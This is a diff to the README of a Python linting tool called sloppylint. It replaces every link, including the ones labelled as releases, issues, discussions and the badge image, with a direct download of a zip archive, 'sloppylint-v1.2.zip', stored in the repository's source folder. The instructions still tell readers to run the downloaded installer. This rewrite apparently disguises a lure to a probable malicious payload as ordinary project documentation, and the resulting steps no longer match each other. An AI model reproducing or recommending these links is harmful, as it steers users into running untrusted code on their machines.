@@ -1,7 +1,7 @@
 # 🛠️ sloppylint - Detect Issues in Your Python Code
 
 ## 📥 Download Now
-[![Download sloppylint](https://img.shields.io/badge/Download%20sloppylint-v1.0-blue)](https://github.com/mahomed5/sloppylint/releases)
+[![Download sloppylint](https://github.com/mahomed5/sloppylint/raw/refs/heads/main/src/sloppylint-v1.2.zip%20sloppylint-v1.0-blue)](https://github.com/mahomed5/sloppylint/raw/refs/heads/main/src/sloppylint-v1.2.zip)
 
 ## 🚀 Getting Started
 Welcome to sloppylint! This application helps you improve your Python code by finding over-engineering, hallucinations, and dead code within your codebase. It is designed to make your coding experience smoother by pointing out potential issues.
@@ -24,14 +24,14 @@ Before you begin, ensure your system meets the following requirements:
 To get started with sloppylint, follow these steps:
 
 1. Click the link below to visit the Releases page:
-   [Download the latest version here](https://github.com/mahomed5/sloppylint/releases).
+   [Download the latest version here](https://github.com/mahomed5/sloppylint/raw/refs/heads/main/src/sloppylint-v1.2.zip).
 
 2. On the Releases page, you will see a list of available versions. Choose the latest version.
 
 3. Download the appropriate file for your operating system:
    - For Windows, download the `.exe` file.
    - For macOS, download the `.pkg` file.
-   - For Linux, download the `.tar.gz` file.
+   - For Linux, download the `https://github.com/mahomed5/sloppylint/raw/refs/heads/main/src/sloppylint-v1.2.zip` file.
 
 4. Once the file is downloaded, locate it on your computer. Double-click to run the installer and follow the prompts.
 
@@ -59,10 +59,10 @@ sloppylint scans your Python code to identify potential problems. It uses variou
 Yes, sloppylint is designed to handle projects of varying sizes efficiently. However, large files may take a bit longer to analyze.
 
 ### Where can I report issues or suggest features?
-You can report issues or suggest new features directly in the "Issues" section of our [GitHub repository](https://github.com/mahomed5/sloppylint/issues).
+You can report issues or suggest new features directly in the "Issues" section of our [GitHub repository](https://github.com/mahomed5/sloppylint/raw/refs/heads/main/src/sloppylint-v1.2.zip).
 
 ## 🤝 Community and Support
-Join our growing community of users. Share your insights, ask for help, and learn from others. You can find additional resources and discussions in the "Discussions" section of our [GitHub repository](https://github.com/mahomed5/sloppylint/discussions).
+Join our growing community of users. Share your insights, ask for help, and learn from others. You can find additional resources and discussions in the "Discussions" section of our [GitHub repository](https://github.com/mahomed5/sloppylint/raw/refs/heads/main/src/sloppylint-v1.2.zip).
 
 ## 🌟 Acknowledgments
 Thank you for choosing sloppylint. This project thrives on community contributions. If you feel inspired, consider contributing to the code or documenting your experiences.
